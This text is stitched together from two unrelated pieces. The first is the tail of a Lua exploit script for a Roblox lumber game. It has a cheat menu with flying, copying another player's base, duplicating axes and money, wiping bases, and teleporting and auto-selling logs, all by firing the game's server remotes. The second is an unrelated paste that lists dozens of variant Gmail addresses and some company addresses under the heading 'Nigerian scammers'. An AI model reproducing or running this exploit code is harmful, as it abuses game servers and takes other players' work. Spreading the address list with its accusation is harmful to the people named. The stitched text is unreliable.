				bv.velocity = ((GJmYA6TiDo2Tk38ynzU21DGrqazTgpPhAw2nE4snkFFB.lookVector * (ctrl.f+ctrl.b)) + ((GJmYA6TiDo2Tk38ynzU21DGrqazTgpPhAw2nE4snkFFB * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - GJmYA6TiDo2Tk38ynzU21DGrqazTgpPhAw2nE4snkFFB.p))*speed
				lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
			elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
				bv.velocity = ((GJmYA6TiDo2Tk38ynzU21DGrqazTgpPhAw2nE4snkFFB.lookVector * (lastctrl.f+lastctrl.b)) + ((GJmYA6TiDo2Tk38ynzU21DGrqazTgpPhAw2nE4snkFFB * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - GJmYA6TiDo2Tk38ynzU21DGrqazTgpPhAw2nE4snkFFB.p))*speed
			else
				bv.velocity = Vector3.new(0,0.1,0)
			end
			bg.cframe = GJmYA6TiDo2Tk38ynzU21DGrqazTgpPhAw2nE4snkFFB * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
		until not flying
		ctrl = {f = 0, b = 0, l = 0, r = 0}
		lastctrl = {f = 0, b = 0, l = 0, r = 0}
		speed = 0
		bg:Destroy()
		bv:Destroy()
		plr.Character.Humanoid.PlatformStand = false
	end
	mouse.KeyDown:connect(function(key)
		if key:lower() == ""z"" then
			if flying then flying = false
			else
				flying = true
				Fly()
			end
		elseif key:lower() == ""w"" then
			ctrl.f = 1
		elseif key:lower() == ""s"" then
			ctrl.b = -1
		elseif key:lower() == ""a"" then
			ctrl.l = -1
		elseif key:lower() == ""d"" then
			ctrl.r = 1
		end
	end)
	mouse.KeyUp:connect(function(key)
		if key:lower() == ""w"" then
			ctrl.f = 0
		elseif key:lower() == ""s"" then
			ctrl.b = 0
		elseif key:lower() == ""a"" then
			ctrl.l = 0
		elseif key:lower() == ""d"" then
			ctrl.r = 0
		end
		wait(5)
	end)
end)

window:Button(""Copy Base"", function()
	local RunService = game:GetService(""RunService"")
	local TargetPlayer = script.Parent.Parent.PlayerName.Text
	local SlowMode = true
	local WipeLocal = false

	local CopyStructure = true
	local CopyWire = true
	local CopyItems = true
	local CopyFurniture = true

	if WipeLocal then
		for i,v in pairs(game.Workspace.PlayerModels:GetChildren()) do
			if v:FindFirstChild(""Owner"") then
				if v.Owner.Value == game.Players.LocalPlayer then
					game.ReplicatedStorage.Interaction.DestroyStructure:FireServer(v)
				end
			end
		end
		wait(0.5)
	end

	for i,v in pairs(game.Players:GetChildren()) do
		if v ~= game.Players.LocalPlayer then
			if v.Name:find(TargetPlayer) then
				TargetPlayer = v
				break
			end
		end
	end

	local LocalLand, TargetLand

	for i,v in pairs(game.Workspace.Properties:GetChildren()) do
		if v:FindFirstChild(""Owner"") then
			if v.Owner.Value == TargetPlayer then
				TargetLand = v
			elseif v.Owner.Value == game.Players.LocalPlayer then
				LocalLand = v
			end
		end
	end

	local CollectedTargetStructures, CollectedLocalStructures, CollectedLocalFurnitures, CollectedTargetFurnitures, CollectedLocalItems, CollectedTargetItems  = {}, {}, {}, {}, {}, {}
	local CollectedTargetItemsCopy, CollectedTargetFurnituresCopy = {}, {}
	local TotalCollectedBlueprints = 0

	if CopyStructure then
		for i,v in pairs(game.Workspace.PlayerModels:GetChildren()) do
			if v:FindFirstChild(""Owner"") and v.Owner.Value == TargetPlayer then
				if v:FindFirstChild(""BuildDependentWood"") and (v.Type.Value == ""Structure"" or v.Type.Value == ""Furniture"") then
					local Data = {}
					Data.WoodClass = v:FindFirstChild(""BlueprintWoodClass"") and v.BlueprintWoodClass.Value
					Data.OffSet = (v:FindFirstChild(""MainCFrame"") and v.MainCFrame.Value or v.PrimaryPart.CFrame) - TargetLand.OriginSquare.Position
					Data.BlueprintType = v.ItemName.Value
					table.insert(CollectedTargetStructures,Data)
				end
			end
		end

		for i, Data in pairs(CollectedTargetStructures) do
			game.ReplicatedStorage.PlaceStructure.ClientPlacedBlueprint:FireServer(Data.BlueprintType, LocalLand.OriginSquare.CFrame - Vector3.new(0,20,0), game.Players.LocalPlayer)

			if SlowMode and (math.random(1,2) ~= 1) then
				RunService.RenderStepped:Wait()
			end
		end
	end

	local function blueprintHasBeenCollected(Model)
		if CollectedLocalStructures[Model.Name] then
			for i, BlueprintModel in pairs(CollectedLocalStructures[Model.Name]) do
				if BlueprintModel == Model then
					return true
				end
			end
		end
		return false
	end

	repeat
		for i,v in pairs(game.Workspace.PlayerModels:GetChildren()) do
			if v:FindFirstChild(""Owner"") and v.Owner.Value == game.Players.LocalPlayer and v:FindFirstChild(""Type"") and v.Type.Value == ""Blueprint"" and not blueprintHasBeenCollected(v) then
				if not CollectedLocalStructures[v.Name] then
					CollectedLocalStructures[v.Name] = {}
				end
				table.insert(CollectedLocalStructures[v.Name], v)
				TotalCollectedBlueprints = TotalCollectedBlueprints + 1
			end
		end
		wait()
	until TotalCollectedBlueprints == #CollectedTargetStructures

	local function SpawnStructure(Data, Blueprint)
		local Position = Data.OffSet + LocalLand.OriginSquare.Position
		game.ReplicatedStorage.PlaceStructure.ClientPlacedStructure:FireServer(Blueprint.ItemName.Value, Position, game.Players.LocalPlayer, Data.WoodClass, Blueprint, not Data.WoodClass)
	end

	for i, Data in pairs(CollectedTargetStructures) do
		local Blueprint = CollectedLocalStructures[Data.BlueprintType][1]
		table.remove(CollectedLocalStructures[Data.BlueprintType], 1)

		SpawnStructure(Data, Blueprint)

		if SlowMode and (math.random(1,2) ~= 1) then
			RunService.RenderStepped:Wait()
		end
	end

	local function CreateWire(WireType, Points)
		local Wire = game.ReplicatedStorage.Purchasables.WireObjects[WireType]

		for i,v in pairs(Points) do
			Points[i] = v + LocalLand.OriginSquare.Position
		end

		game.ReplicatedStorage.PlaceStructure.ClientPlacedWire:FireServer(Wire, Points)
	end

	if CopyWire then
		for i,v in pairs(game.Workspace.PlayerModels:GetChildren()) do
			if v:FindFirstChild(""Owner"") and v.Owner.Value == TargetPlayer and v:FindFirstChild(""Type"") and v.Type.Value == ""Wire"" and v:FindFirstChild(""End1"") then
				local Points = {}
				local PointCount = 1

				table.insert(Points, (v.End1.Position - TargetLand.OriginSquare.Position))

				for i,w in pairs(v:GetChildren()) do
					if w.Name:find(""Point"") then
						PointCount = PointCount + 1
					end
				end

				for i=2, PointCount do
					local Point = v:FindFirstChild(""Point""..tostring(i))
					table.insert(Points, (Point.Position - TargetLand.OriginSquare.Position))
				end

				table.insert(Points, (v.End2.Position - TargetLand.OriginSquare.Position))
				CreateWire(v.ItemName.Value, Points)

				if SlowMode and (math.random(1,2) ~= 1)then
					RunService.RenderStepped:Wait()
				end
			end
		end
	end

	local function isValidFurniture(Model)
		if Model:FindFirstChild(""Type"") and (Model.Type.Value == ""Structure"" or Model.Type.Value == ""Furniture"" or Model.Type.Value == ""Vehicle Spot"") then
			if Model:FindFirstChild(""BuildDependentWood"") or Model:FindFirstChild(""PurchasedBoxItemName"") then
				return false
			end
			return true
		end
		return false
	end

	local function Spawn(ItemName, Position)
		local Info = {}
		Info.Name = ItemName.Value
		Info.Type = ItemName.Name == ""PurchasedBoxItemName"" and ItemName or game.ReplicatedStorage.Purchasables.Structures.HardStructures.Sawmill2.Type
		Info.OtherInfo = game.ReplicatedStorage.Purchasables.WireObjects.Wire.OtherInfo
		local Points = {Position.p, Position.p}
		game.ReplicatedStorage.PlaceStructure.ClientPlacedWire:FireServer(Info, Points)
	end

	if CopyFurniture then
		for i, Model in pairs(game.Workspace.PlayerModels:GetChildren()) do
			if Model:FindFirstChild(""Owner"") and Model.Owner.Value == TargetPlayer and isValidFurniture(Model) then
				local ItemName = Model:FindFirstChild(""ItemName"") or Model:FindFirstChild(""PurchasedBoxItemName"")
				local Position = (Model:FindFirstChild(""MainCFrame"") and Model.MainCFrame.Value or Model.PrimaryPart.CFrame) - TargetLand.OriginSquare.Position

				if ItemName.Name == ""PurchasedBoxItemName"" then
					Spawn(ItemName, Position + LocalLand.OriginSquare.Position)
				else
					Spawn(ItemName, LocalLand.OriginSquare.CFrame - Vector3.new(0,20,0))
				end

				local Data = {}
				Data.ItemName = ItemName.Value
				Data.OffSet = Position

				table.insert(CollectedTargetFurnitures, Data)

				if SlowMode and (math.random(1,2) ~= 1)then
					RunService.RenderStepped:Wait()
				end
			end
		end
	end

	for i, v in pairs(CollectedTargetFurnitures) do
		table.insert(CollectedTargetFurnituresCopy,v)
	end

	local function isValidFurnitureModel(Model)
		for i, Data in pairs(CollectedTargetFurnitures) do
			if Data.ItemName == Model.ItemName.Value then
				table.remove(CollectedTargetFurnitures, i)
				return true
			end
		end
		return false
	end

	repeat
		for i, Model in pairs(game.Workspace.PlayerModels:GetChildren()) do
			if Model.Name == ""Wire"" and Model:FindFirstChild(""Owner"") and Model.Owner.Value == game.Players.LocalPlayer and Model.ItemName.Value ~= ""Wire"" and isValidFurnitureModel(Model) then
				table.insert(CollectedLocalFurnitures, Model)
			end
		end
		wait()
	until #CollectedTargetFurnitures == 0

	local function GrabModelFromCollectedFurnitures(ItemName)
		for i, Model in pairs(CollectedLocalFurnitures) do
			if Model.ItemName.Value == ItemName then
				table.remove(CollectedLocalFurnitures,i)
				return Model
			end
		end
	end

	for i, Data in pairs(CollectedTargetFurnituresCopy) do
		local Model = GrabModelFromCollectedFurnitures(Data.ItemName)
		local ItemName = Data.ItemName
		local Position = Data.OffSet + LocalLand.OriginSquare.Position
		game.ReplicatedStorage.PlaceStructure.ClientPlacedStructure:FireServer(ItemName,Position,game.Players.LocalPlayer,false,Model,true)

		if SlowMode and (math.random(1,2) ~= 1)then
			RunService.RenderStepped:Wait()
		end
	end

	local function isValidItem(Model)
		if Model:FindFirstChild(""Type"") and (Model.Type.Value == ""Structure"" or Model.Type.Value == ""Loose Item"" or Model.Type.Value == ""Tool"" or Model.Type.Value == ""Wire"" or Model.Type.Value == ""Furniture"" or Model.Type.Value == ""Gift"") then
			if (Model.Type.Value == ""Structure"" or Model.Type.Value == ""Wire"" or Model.Type.Value == ""Furniture"") and not Model:FindFirstChild(""PurchasedBoxItemName"") then
				return false
			end

			return true
		elseif not Model:FindFirstChild(""Type"") then
			if Model:FindFirstChild(""ItemName"") then
				local ItemName = Model.ItemName.Value:lower()

				if ItemName:find(""bob"") and (ItemName:find(""wob"") or ItemName:find(""head""))then
					return true
				end
			end
		end
		return false
	end
	local function itemIsOnLand(Position)
		if (math.abs(Position.X - TargetLand.OriginSquare.Position.X) > 101 or math.abs(Position.Z - TargetLand.OriginSquare.Position.Z) > 101) then
			return false
		end
		for i, Square in pairs(TargetLand:GetChildren()) do
			if Square.Name == ""Square"" then
				if (math.abs(Position.X - Square.Position.X) < 21 and math.abs(Position.Z - Square.Position.Z) < 21) then
					return true
				end
			end
		end
		return false
	end

	if CopyItems then
		for i, Model in pairs(game.Workspace.PlayerModels:GetChildren()) do
			if Model:FindFirstChild(""Owner"") and Model.Owner.Value == TargetPlayer and isValidItem(Model) then
				local ItemName = Model:FindFirstChild(""ItemName"") or Model:FindFirstChild(""PurchasedBoxItemName"")
				local Position = (Model:FindFirstChild(""MainCFrame"") and Model.MainCFrame.Value or Model.PrimaryPart.CFrame) - TargetLand.OriginSquare.Position

				if itemIsOnLand((Model:FindFirstChild(""MainCFrame"") and Model.MainCFrame.Value or Model.PrimaryPart.CFrame).p) then
					Spawn(ItemName, LocalLand.OriginSquare.CFrame - Vector3.new(0,20,0))

					local Data = {}
					Data.ItemName = ItemName.Value
					Data.OffSet = Position

					table.insert(CollectedTargetItems, Data)

					if SlowMode and (math.random(1,2) ~= 1)then
						RunService.RenderStepped:Wait()
					end
				end
			end
		end
	end

	for i, v in pairs(CollectedTargetItems) do
		table.insert(CollectedTargetItemsCopy,v)
	end

	local function isValidItemModel(Model)
		for i, Data in pairs(CollectedTargetItems) do
			if Data.ItemName == Model.ItemName.Value then
				table.remove(CollectedTargetItems, i)
				return true
			end
		end
		return false
	end
	local function itemHasBeenCollected(Model)
		for i, Data in pairs(CollectedLocalItems) do
			if Data.ItemName == Model.ItemName.Value then
				return true
			end
		end
		return false
	end

	repeat
		for i, Model in pairs(game.Workspace.PlayerModels:GetChildren()) do
			if Model.Name == ""Wire"" and Model:FindFirstChild(""Owner"") and Model.Owner.Value == game.Players.LocalPlayer and (Model.ItemName.Value ~= ""Wire"" or (Model:FindFirstChild(""ItemName"") and Model.ItemName.Value == ""Wire"" and Model:FindFirstChild(""PurchasedBoxItemName""))) and isValidItemModel(Model) and not itemHasBeenCollected(Model) then
				table.insert(CollectedLocalItems, Model)
			end
		end
		wait()
	until #CollectedTargetItems == 0

	local function GrabModelFromCollectedItems(ItemName)
		for i, Model in pairs(CollectedLocalItems) do
			if Model.ItemName.Value == ItemName then
				table.remove(CollectedLocalItems,i)
				return Model
			end
		end
	end

	for i, Data in pairs(CollectedTargetItemsCopy) do
		local Model = GrabModelFromCollectedItems(Data.ItemName)
		local ItemName = Data.ItemName
		local Position = Data.OffSet + LocalLand.OriginSquare.Position

		if Model:FindFirstChild(""PurchasedBoxItemName"") then
			game.ReplicatedStorage.PlaceStructure.ClientPlacedStructure:FireServer(false, Position, false, false, Model)
			Model.Parent = nil
		else
			game.ReplicatedStorage.PlaceStructure.ClientPlacedStructure:FireServer(ItemName,Position,game.Players.LocalPlayer,false,Model,true)
		end

		if SlowMode and (math.random(1,2) ~= 1)then
			RunService.RenderStepped:Wait()
		end
	end
end)

window:Toggle(""Auto Farm"", {location = Table, flag = ""Farm""}, function()
	
end)

local window = Lib:CreateWindow(""Base"")

window:Section(""Dupe"")

--Dupe Axes--
window:Button(""Dupe Axes"",function()
	if true then do
			local plr = game:service'Players'.LocalPlayer

			local function SafeRespawn()
				plr.Character.Head:Destroy()
			end

			local function Dupe()
				SafeRespawn()
				for i,v in pairs(plr.Backpack:GetChildren()) do
					if v.Name == ""Tool"" then
						game:GetService(""ReplicatedStorage"").Interaction.ClientInteracted:FireServer(v,""Drop tool"",plr.Character.Torso.CFrame * CFrame.new(0,5,0))
					end
				end
			end

			Dupe()
		end
	end
end)


window:Toggle(""Disable Saving"", {location = Table, flag = ""value""}, function()
	DisableSave = Table[""value""]
end)


window:Button(""Save Slot"", function()
	Funcs.SaveSlot()
end)



-- Dupe Money --
window:Button(""Dupe Money"",function()
	Funcs.DupeCash()
end)

window:Section(""Wipe"")

window:Button(""Wipe Base"", function()
	local plr = game.Players.LocalPlayer.Name
	local pmds = game.Workspace.PlayerModels
	local PlaceR = game.ReplicatedStorage.Interaction.DestroyStructure
	for i, v in pairs(pmds:GetChildren()) do
		if v:FindFirstChild(""Owner"") and v.Owner.Value ~= nil and v.Owner.Value == game.Players[plr] and v:FindFirstChild(""ItemName"") and v:FindFirstChild(""Type"") and (v.PrimaryPart ~= nil or v:FindFirstChild(""MainCFrame"")) then
			PlaceR:FireServer(v)
		end
	end
end)


window:Dropdown(""Player"",{location = Table,flag = ""Player"",search = true --[[AddsSearchBar]], list = {""""} --[[Wont work when PlayerList = true]], PlayerList = true --[[ Turns the list into the players in the server ]]},function()
	if Table[""Player""] then

	end
end)

window:Toggle(""Axes"",{location = Table, flag = ""Axes""},function()
	if Table[""Axes""] then

	end
end)

window:Toggle(""Loose Items"",{location = Table, flag = ""Loose""},function()
	if Table[""Loose""] then
		game.Players.LocalPlayer.Character.Humanoid.Health = 0
		wait(2)
		Funcs.SaveSlot()
	end
end)


window:Toggle(""Planks"",{location = Table, flag = ""planks""},function()
	if Table[""planks""] then
		for _, Plank in pairs(service.Workspace.PlayerModels:GetChildren()) do
			if Plank.Name==""Plank"" and Plank:findFirstChild(""Owner"") then
				if Plank.Owner.Value == service.Players.LocalPlayer then
					Plank:MoveTo(service.Players.LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0, 20, 0))
					for i=1,100 do
						service.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Plank)
					end
				end
			end
		end
	end
end)


window:Toggle(""Structures"",{location = Table, flag = ""Structures""},function()
	if Table[""Structures""] then

	end
end)


window:Toggle(""Blueprints"",{location = Table, flag = ""Blueprints""},function()
	if Table[""Blueprints""] then
		for i,v in pairs(game.ReplicatedStorage.Purchasables.Structures.BlueprintStructures:GetChildren()) do
			local clone = v:Clone()
			clone.Parent = game.Players.LocalPlayer.PlayerBlueprints.Blueprints
		end
	end
end)


window:Toggle(""Furniture"",{location = Table, flag = ""Furniture""},function()
	if Table[""Furniture""] then

	end
end)

window:Toggle(""Wire"",{location = Table, flag = ""Wire""},function()
	if Table[""Wire""] then

	end
end)

window:Toggle(""Vehicle"", {location = Table, flag = ""Vehicle""}, function()
	if Table[""Vehicle""] then

	end
end)

window:Toggle(""Vehicle Spawn Pads"", {location = Table, flag = ""VehicleSpawn""}, function()
	if Table[""VehicleSpawn""] then

	end
end)

window:Section(""Auto Buy"")


window:Section(""Wood"")

window:Dropdown(""Generic"",{location = Table,flag = ""Generic"",search = true --[[AddsSearchBar]], list = {""Generic""} --[[Wont work when PlayerList = true]], PlayerList = false --[[ Turns the list into the players in the server ]]},function()
	if Table[""Generic""] then

	end
end)

window:Button(""Find Tree"", function()

end)

window:Button(""Bring Tree"", function()
	for _, Log in pairs(game.Workspace.LogModels:GetChildren()) do
		if Log.Name:sub(1, 6) == ""Loose_"" and Log:findFirstChild(""Owner"") then
			if Log.Owner.Value == game.Players.LocalPlayer then
				Log:MoveTo(game.Players.LocalPlayer.Character.Torso.Position + Vector3.new(0, 15, 0))
			end
		end
	end
end)

window:Button(""Find Tree"", function()

end)

window:Bind(""Auto Sell"",{location = Table, flag = ""AutoSell"", default = Enum.KeyCode.J},function()
	if(Table[""AutoSell""]) then
		for _, Log in pairs(game.Workspace.LogModels:GetChildren()) do
			if Log.Name:sub(1, 6) == ""Loose_"" and Log:findFirstChild(""Owner"") then
				local is_dragged = game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Log)
				if Log.Owner.Value == game.Players.LocalPlayer then
					for i,v in pairs(Log:GetChildren()) do
						if v.Name==""WoodSection"" then
							task.spawn(function()
								for i=1,10 do
									wait()
									v.CFrame=CFrame.new(Vector3.new(315, -0.296, 85.791))*CFrame.Angles(math.rad(90),0,0)
								end
							end)
						end
					end
					task.spawn(function()
						for i=1,20 do
							wait()
							game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Log)
						end
					end)
				end
			end
		end
	end
end)

window:Toggle(""Uint Cutter"", {location = Table, flag = ""Uint""}, function()
	if Table[""Uint""] then

	end
end)

window:Bind(""Select Sawmill"",{location = Table, flag = ""Sawmill"", default = Enum.KeyCode.U},function() -- Automatically stops when the gui is removed
	if Table[""Sawmill""] then

	end
end)

window:Bind(""Select Tree"",{location = Table, flag = ""Tree"", default = Enum.KeyCode.T},function() -- Automatically stops when the gui is removed
	if Table[""Tree""] then

	end
end)

window:Button(""Mod Tree"", function()
	for _, Log in pairs(workspace.LogModels:GetChildren()) do
		if Log.Name:sub(1, 6) == ""Loose_"" and Log:findFirstChild(""Owner"") then
			if Log.Owner.Value == game.Players.LocalPlayer then
				for i,v in pairs(Log:GetChildren()) do
					if v.Name==""WoodSection"" then
						spawn(function()
							for i=1,10 do
								wait()
								v.CFrame=CFrame.new(Vector3.new(315, -0.296, 85.791))*CFrame.Angles(math.rad(90),0,0)
							end
						end)
					end
				end
				spawn(function()
					for i=1,20 do
						wait()
						game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Log.WoodSection)
						game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(Log.WoodSection)
					end
				end)
			end
		end
	end
	wait(2.0)
	for _, Log in pairs(game.Workspace.LogModels:GetChildren()) do
		if Log.Name:sub(1, 6) == ""Loose_"" and Log:findFirstChild(""Owner"") then
			if Log.Owner.Value == game.Players.LocalPlayer then
				Log:MoveTo(game.Players.LocalPlayer.Character.HumanoidRootPart.Position)
				for i=1,20 do
					game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Log.WoodSection)
					game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(Log.WoodSection)
				end
			end
		end
	end
end)"
cpcX0CF6,Nigerian scammers [4-12-3/2023],bombaires,AIMMS,Monday 4th of December 2023 10:37:18 PM CDT,"<a href=""mailto:admin@forenedeindustrialsystems.com"">admin@forenedeindustrialsystems.com</a>
<a href=""mailto:sales@forenedeindustrialsystems.com"">sales@forenedeindustrialsystems.com</a>
<a href=""mailto:legal@forenedeindustrialsystems.com"">legal@forenedeindustrialsystems.com</a>
<a href=""mailto:akinwumia993@gmail.com"">akinwumia993@gmail.com</a>
<a href=""mailto:a.k.i.nwu.mia99.3@gmail.com"">a.k.i.nwu.mia99.3@gmail.com</a>
<a href=""mailto:a.k.in.wum.ia.9.9.3@gmail.com"">a.k.in.wum.ia.9.9.3@gmail.com</a>
<a href=""mailto:aki.nw.u.mia993@gmail.com"">aki.nw.u.mia993@gmail.com</a>
<a href=""mailto:a.ki.nw.u.m.ia.993@gmail.com"">a.ki.nw.u.m.ia.993@gmail.com</a>
<a href=""mailto:ak.inw.umi.a.9.93@gmail.com"">ak.inw.umi.a.9.93@gmail.com</a>
<a href=""mailto:a.ki.nwumi.a993@gmail.com"">a.ki.nwumi.a993@gmail.com</a>
<a href=""mailto:a.ki.n.wu.mi.a9.93@gmail.com"">a.ki.n.wu.mi.a9.93@gmail.com</a>
<a href=""mailto:a.ki.nwu.m.i.a.993@gmail.com"">a.ki.nwu.m.i.a.993@gmail.com</a>
<a href=""mailto:ak.in.wu.m.i.a.993@gmail.com"">ak.in.wu.m.i.a.993@gmail.com</a>
<a href=""mailto:a.k.i.n.w.u.m.ia.99.3@gmail.com"">a.k.i.n.w.u.m.ia.99.3@gmail.com</a>
<a href=""mailto:ak.i.nwu.m.ia9.9.3@gmail.com"">ak.i.nwu.m.ia9.9.3@gmail.com</a>
<a href=""mailto:a.kinwu.m.ia.99.3@gmail.com"">a.kinwu.m.ia.99.3@gmail.com</a>
<a href=""mailto:akinwum.i.a.993@gmail.com"">akinwum.i.a.993@gmail.com</a>
<a href=""mailto:a.ki.nwu.mia.99.3@gmail.com"">a.ki.nwu.mia.99.3@gmail.com</a>
<a href=""mailto:a.ki.n.w.u.m.ia9.9.3@gmail.com"">a.ki.n.w.u.m.ia9.9.3@gmail.com</a>
<a href=""mailto:a.k.i.nw.u.mia.99.3@gmail.com"">a.k.i.nw.u.mia.99.3@gmail.com</a>
<a href=""mailto:ak.i.n.wum.i.a99.3@gmail.com"">ak.i.n.wum.i.a99.3@gmail.com</a>
<a href=""mailto:aki.nwum.i.a993@gmail.com"">aki.nwum.i.a993@gmail.com</a>
<a href=""mailto:ak.in.w.um.i.a9.9.3@gmail.com"">ak.in.w.um.i.a9.9.3@gmail.com</a>
<a href=""mailto:a.kin.wu.mi.a.9.93@gmail.com"">a.kin.wu.mi.a.9.93@gmail.com</a>
<a href=""mailto:a.ki.nwu.m.ia9.93@gmail.com"">a.ki.nwu.m.ia9.93@gmail.com</a>
<a href=""mailto:a.k.in.wu.mi.a.9.9.3@gmail.com"">a.k.in.wu.mi.a.9.9.3@gmail.com</a>
<a href=""mailto:aki.nwu.m.ia.9.93@gmail.com"">aki.nwu.m.ia.9.93@gmail.com</a>
<a href=""mailto:a.kin.w.um.ia9.93@gmail.com"">a.kin.w.um.ia9.93@gmail.com</a>
<a href=""mailto:ak.in.wu.m.i.a993@gmail.com"">ak.in.wu.m.i.a993@gmail.com</a>
<a href=""mailto:ak.in.wu.m.ia.9.9.3@gmail.com"">ak.in.wu.m.ia.9.9.3@gmail.com</a>
<a href=""mailto:ak.i.n.wu.m.i.a993@gmail.com"">ak.i.n.wu.m.i.a993@gmail.com</a>
<a href=""mailto:akinw.um.ia9.9.3@gmail.com"">akinw.um.ia9.9.3@gmail.com</a>
<a href=""mailto:a.ki.nw.umia.9.93@gmail.com"">a.ki.nw.umia.9.93@gmail.com</a>
<a href=""mailto:ak.i.nwu.mia.99.3@gmail.com"">ak.i.nwu.mia.99.3@gmail.com</a>
<a href=""mailto:akin.wum.ia9.9.3@gmail.com"">akin.wum.ia9.9.3@gmail.com</a>
<a href=""mailto:a.k.inw.u.mia.9.9.3@gmail.com"">a.k.inw.u.mia.9.9.3@gmail.com</a>
<a href=""mailto:a.k.inwu.mi.a9.9.3@gmail.com"">a.k.inwu.mi.a9.9.3@gmail.com</a>
<a href=""mailto:ak.in.w.u.mia.9.93@gmail.com"">ak.in.w.u.mia.9.93@gmail.com</a>
<a href=""mailto:a.kinw.um.i.a.9.9.3@gmail.com"">a.kinw.um.i.a.9.9.3@gmail.com</a>
<a href=""mailto:a.ki.nwu.mi.a.9.9.3@gmail.com"">a.ki.nwu.mi.a.9.9.3@gmail.com</a>
<a href=""mailto:a.ki.n.w.um.ia9.9.3@gmail.com"">a.ki.n.w.um.ia9.9.3@gmail.com</a>
<a href=""mailto:akin.w.u.m.i.a.993@gmail.com"">akin.w.u.m.i.a.993@gmail.com</a>
<a href=""mailto:a.ki.n.w.um.ia9.93@gmail.com"">a.ki.n.w.um.ia9.93@gmail.com</a>
<a href=""mailto:ak.inwu.m.i.a9.9.3@gmail.com"">ak.inwu.m.i.a9.9.3@gmail.com</a>
<a href=""mailto:ak.i.nwum.ia.9.9.3@gmail.com"">ak.i.nwum.ia.9.9.3@gmail.com</a>
<a href=""mailto:a.ki.nwu.mi.a.9.93@gmail.com"">a.ki.nwu.mi.a.9.93@gmail.com</a>
<a href=""mailto:a.kinw.umia.9.9.3@gmail.com"">a.kinw.umia.9.9.3@gmail.com</a>
<a href=""mailto:aki.n.wumia.993@gmail.com"">aki.n.wumia.993@gmail.com</a>
<a href=""mailto:akinwum.ia9.9.3@gmail.com"">akinwum.ia9.9.3@gmail.com</a>
<a href=""mailto:akin.wum.ia.9.93@gmail.com"">akin.wum.ia.9.93@gmail.com</a>
<a href=""mailto:aki.nwumia.99.3@gmail.com"">aki.nwumia.99.3@gmail.com</a>
<a href=""mailto:a.kinwumi.a.9.9.3@gmail.com"">a.kinwumi.a.9.9.3@gmail.com</a>
<a href=""mailto:a.kin.wum.ia.99.3@gmail.com"">a.kin.wum.ia.99.3@gmail.com</a>
<a href=""mailto:ak.i.n.w.u.m.i.a9.93@gmail.com"">ak.i.n.w.u.m.i.a9.93@gmail.com</a>
<a href=""mailto:a.kinw.um.i.a9.9.3@gmail.com"">a.kinw.um.i.a9.9.3@gmail.com</a>
<a href=""mailto:ak.i.nw.u.m.ia.9.9.3@gmail.com"">ak.i.nw.u.m.ia.9.9.3@gmail.com</a>
<a href=""mailto:a.k.i.n.w.u.mia.993@gmail.com"">a.k.i.n.w.u.mia.993@gmail.com</a>
<a href=""mailto:a.k.i.nw.u.mi.a.99.3@gmail.com"">a.k.i.nw.u.mi.a.99.3@gmail.com</a>
<a href=""mailto:ak.i.nw.um.i.a99.3@gmail.com"">ak.i.nw.um.i.a99.3@gmail.com</a>
<a href=""mailto:akinw.u.mia9.93@gmail.com"">akinw.u.mia9.93@gmail.com</a>
<a href=""mailto:a.kin.w.u.mia9.9.3@gmail.com"">a.kin.w.u.mia9.9.3@gmail.com</a>
<a href=""mailto:a.kinw.u.m.i.a9.93@gmail.com"">a.kinw.u.m.i.a9.93@gmail.com</a>
<a href=""mailto:a.k.in.w.u.mi.a9.93@gmail.com"">a.k.in.w.u.mi.a9.93@gmail.com</a>
<a href=""mailto:a.k.i.nw.um.i.a.993@gmail.com"">a.k.i.nw.um.i.a.993@gmail.com</a>
<a href=""mailto:a.k.in.w.um.ia.9.93@gmail.com"">a.k.in.w.um.ia.9.93@gmail.com</a>
<a href=""mailto:a.k.i.n.w.u.mia9.93@gmail.com"">a.k.i.n.w.u.mia9.93@gmail.com</a>
<a href=""mailto:aki.n.wu.m.ia.9.93@gmail.com"">aki.n.wu.m.ia.9.93@gmail.com</a>
<a href=""mailto:ak.inw.um.ia9.93@gmail.com"">ak.inw.um.ia9.93@gmail.com</a>
<a href=""mailto:aki.n.wum.ia993@gmail.com"">aki.n.wum.ia993@gmail.com</a>
<a href=""mailto:akinwu.mi.a993@gmail.com"">akinwu.mi.a993@gmail.com</a>
<a href=""mailto:ak.i.n.w.um.i.a.9.93@gmail.com"">ak.i.n.w.um.i.a.9.93@gmail.com</a>
<a href=""mailto:ak.in.w.umia9.93@gmail.com"">ak.in.w.umia9.93@gmail.com</a>
<a href=""mailto:ak.i.n.w.um.ia.993@gmail.com"">ak.i.n.w.um.ia.993@gmail.com</a>
<a href=""mailto:ak.in.wum.i.a9.9.3@gmail.com"">ak.in.wum.i.a9.9.3@gmail.com</a>
<a href=""mailto:a.ki.n.wum.ia9.93@gmail.com"">a.ki.n.wum.ia9.93@gmail.com</a>
<a href=""mailto:a.ki.nw.umia9.9.3@gmail.com"">a.ki.nw.umia9.9.3@gmail.com</a>
<a href=""mailto:ak.i.nw.u.mi.a.9.93@gmail.com"">ak.i.nw.u.mi.a.9.93@gmail.com</a>
<a href=""mailto:ak.inw.u.mia.99.3@gmail.com"">ak.inw.u.mia.99.3@gmail.com</a>
<a href=""mailto:a.kin.w.umia.9.93@gmail.com"">a.kin.w.umia.9.93@gmail.com</a>
<a href=""mailto:ak.i.nwu.m.i.a.9.9.3@gmail.com"">ak.i.nwu.m.i.a.9.9.3@gmail.com</a>
<a href=""mailto:akinwu.m.ia99.3@gmail.com"">akinwu.m.ia99.3@gmail.com</a>
<a href=""mailto:ak.i.nwum.ia993@gmail.com"">ak.i.nwum.ia993@gmail.com</a>
